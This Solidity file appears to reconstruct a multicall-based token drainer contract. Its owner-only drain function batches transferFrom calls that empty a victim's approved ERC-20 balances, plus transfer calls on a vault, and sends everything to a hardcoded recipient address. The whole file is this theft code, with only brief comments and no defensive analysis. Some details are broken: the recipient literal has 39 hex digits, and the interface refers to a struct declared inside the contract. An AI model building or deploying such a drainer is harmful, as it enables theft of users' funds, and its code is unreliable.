// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

/// @notice High-level reconstruction of a multicall-based token drainer.
/// - Owner-only entrypoint builds a batch of calls and forwards them to a configurable multicall contract.
/// - Drains balances from a target address via transferFrom, and from an internal vault via transfer,
///   sending funds to a hardcoded recipient.
contract MulticallDrainer {
    address public immutable multicallTarget; // stor_0_0_19
    address public immutable setupTarget;     // stor_1_0_19
    address public owner;

    address public constant RECIPIENT = 0xbadfda5596b52b7ccfbf47f323f70bbdcae51d3;

    struct Call {
        address target;
        bytes callData;
        uint256 value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor(address _multicallTarget, address _setupTarget) {
        multicallTarget = _multicallTarget;
        setupTarget = _setupTarget;
        owner = msg.sender;
    }

    function setOwner(address newOwner) external onlyOwner {
        owner = newOwner;
    }

    /// @notice Drains balances from `victim` (using transferFrom) and from `multicallTarget` (using transfer)
    /// for the provided token lists, then forwards all calls to the multicall contract.
    function drain(
        address victim,
        address[] calldata tokensFromVictim,
        address[] calldata tokensFromVault
    ) external onlyOwner {
        uint256 totalCalls = 1 + tokensFromVictim.length + tokensFromVault.length;
        Call[] memory calls = new Call[](totalCalls);

        // Call setupTarget with selector 0xa12d5171 and msg.sender (purpose unknown in bytecode).
        calls[0] = Call({
            target: setupTarget,
            callData: abi.encodeWithSelector(0xa12d5171, msg.sender),
            value: 0
        });

        // Pull from victim via transferFrom
        for (uint256 i = 0; i < tokensFromVictim.length; i++) {
            IERC20 token = IERC20(tokensFromVictim[i]);
            uint256 bal = token.balanceOf(victim);
            calls[1 + i] = Call({
                target: tokensFromVictim[i],
                callData: abi.encodeWithSelector(
                    token.transferFrom.selector,
                    victim,
                    RECIPIENT,
                    bal
                ),
                value: 0
            });
        }

        // Pull from multicallTarget (treated as a vault) via transfer
        for (uint256 i = 0; i < tokensFromVault.length; i++) {
            IERC20 token = IERC20(tokensFromVault[i]);
            uint256 bal = token.balanceOf(multicallTarget);
            calls[1 + tokensFromVictim.length + i] = Call({
                target: tokensFromVault[i],
                callData: abi.encodeWithSelector(
                    token.transfer.selector,
                    RECIPIENT,
                    bal
                ),
                value: 0
            });
        }

        IMulticall(multicallTarget).multicall(true, calls);
    }

    fallback() external payable {
        revert();
    }
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IMulticall {
    function multicall(bool requireSuccess, Call[] calldata calls) external returns (bytes[] memory);
}
